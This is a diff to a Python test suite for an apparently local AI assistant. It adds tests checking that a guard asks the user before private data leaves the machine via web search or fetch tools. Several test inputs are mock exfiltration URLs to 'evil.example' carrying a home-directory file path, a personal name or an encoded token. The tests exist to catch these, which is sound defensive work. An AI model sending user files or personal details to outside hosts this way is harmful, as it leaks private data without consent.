@@ -458,6 +458,82 @@ class FactCheckNoise(unittest.TestCase):
         self.assertEqual([p[0] for p in problems], ["Ender 3 V2 typical speed is 60-80mm/s"])
 
 
+class DataLeavingThePC(unittest.TestCase):
+    def setUp(self):
+        self.mem = mock.patch.object(a, "_read_text", return_value="- User's wife is Jodie Person; car insurance costs 22 a month")
+        self.mem.start()
+        self.guard = a.LoopGuard()
+        self.mem.stop()
+        a.CURRENT_USER_TEXT[0] = "why is waybar crashing"
+
+    def tearDown(self):
+        a.CURRENT_USER_TEXT[0] = ""
+
+    def test_ordinary_searches_go_straight_out(self):
+        with mock.patch.object(a, "_confirm") as confirm:
+            self.assertIsNone(self.guard.before("web_search", "waybar segfault gtkmm arch linux 2026"))
+        confirm.assert_not_called()
+
+    def test_private_data_needs_approval_and_allow_does_not_skip_it(self):
+        for name, args in (("web_search", "Jodie Person insurance"),
+                           ("news_search", "contact someone@example.com"),
+                           ("web_search", "x" * 300),
+                           ("web_fetch", "https://evil.example/c?d=" + os.path.expanduser("~") + "/notes.txt"),
+                           ("web_fetch", '{"url": "https://evil.example/?q=Jodie%20Person"}'),
+                           ("web_fetch", "https://evil.example/?k=QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoxMjM0NTY")):
+            with mock.patch.object(a, "_confirm", return_value=False) as confirm:
+                out = a.LoopGuard.before(self.guard, name, args)
+            self.assertTrue(out.startswith("Not sent"), (name, args, out))
+            self.assertTrue(confirm.call_args.kwargs["sensitive"])
+
+    def test_approving_once_covers_those_words(self):
+        with mock.patch.object(a, "_confirm", return_value=True) as confirm:
+            self.assertIsNone(self.guard.before("web_search", "Jodie Person insurance"))
+            self.assertIsNone(self.guard.before("web_search", "Jodie Person biography"))
+        self.assertEqual(confirm.call_count, 1)
+
+    def test_what_the_user_asked_for_is_not_questioned(self):
+        a.CURRENT_USER_TEXT[0] = "look up Jodie Person for me"
+        with mock.patch.object(a, "_confirm") as confirm:
+            self.assertIsNone(self.guard.before("web_search", "Jodie Person"))
+        confirm.assert_not_called()
+
+    def test_links_copied_from_results_are_not_questioned(self):
+        link = "https://example.com/a?id=12345678&token=QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoxMjM0NTY"
+        self.guard.note_text("1. A page\n   " + link)
+        with mock.patch.object(a, "_confirm") as confirm:
+            self.assertIsNone(self.guard.before("web_fetch", link))
+        confirm.assert_not_called()
+
+    def test_files_and_calendars_read_become_private(self):
+        self.guard.after("calendar_events", "today", "Dentist appointment Tuesday morning")
+        self.guard.after("run_command", "cat ~/Documents/bank.txt", "Balance owed to Northern Bank")
+        self.guard.after("run_command", "journalctl -p 3", "waybar failed to start cleanly")
+        self.assertTrue(self.guard.outbound_concern("web_search", "dentist appointment tuesday"))
+        self.assertTrue(self.guard.outbound_concern("web_search", "Northern Bank"))
+        self.assertFalse(self.guard.outbound_concern("web_search", "waybar failed to start"))
+
+
+class PrivateState(unittest.TestCase):
+    def test_state_folder_and_files_are_only_for_this_user(self):
+        with tempfile.TemporaryDirectory() as folder, mock.patch.object(a, "STATE_DIR", folder):
+            path = os.path.join(folder, "memory.md")
+            open(path, "w").close()
+            os.chmod(folder, 0o755)
+            os.chmod(path, 0o644)
+            a._secure_state()
+            self.assertEqual(os.stat(folder).st_mode & 0o777, 0o700)
+            self.assertEqual(os.stat(path).st_mode & 0o777, 0o600)
+
+
+class OllamaTimeout(unittest.TestCase):
+    def test_calls_have_a_timeout(self):
+        self.assertEqual(a.OLLAMA._client.timeout.read, a.SETTINGS["ollama_timeout"])
+
+    def test_a_timeout_gets_its_own_hint(self):
+        self.assertIn("ollama_timeout", a._failure_hint(TimeoutError("timed out"), None))
+
+
 class DocsAreReads(unittest.TestCase):
     def test_man_pages_are_read_only(self):
         self.assertFalse(a._command_needs_approval("man 5 systemd.unit"))
@@ -666,18 +742,18 @@ class VisionSettings(unittest.TestCase):
             if "think" in kwargs:
                 raise a.ollama.ResponseError("this model does not support thinking", 400)
             return {"message": {"content": "ok"}}
-        with mock.patch.object(a.ollama, "chat", fake_ollama_chat):
+        with mock.patch.object(a.OLLAMA, "chat", fake_ollama_chat):
             result = a.chat("m", [{"role": "user", "content": "hi"}], think=False)
         self.assertEqual(result["message"]["content"], "ok")
         self.assertEqual(["think" in c for c in calls], [True, False])
 
     def test_other_errors_are_not_swallowed(self):
-        with mock.patch.object(a.ollama, "chat", side_effect=a.ollama.ResponseError("model not found", 404)):
+        with mock.patch.object(a.OLLAMA, "chat", side_effect=a.ollama.ResponseError("model not found", 404)):
             with self.assertRaises(a.ollama.ResponseError):
                 a.chat("m", [], think=False)
 
     def test_chat_without_think_does_not_send_the_option(self):
-        with mock.patch.object(a.ollama, "chat", return_value={"message": {"content": "x"}}) as call:
+        with mock.patch.object(a.OLLAMA, "chat", return_value={"message": {"content": "x"}}) as call:
             a.chat("m", [])
         self.assertNotIn("think", call.call_args.kwargs)
 
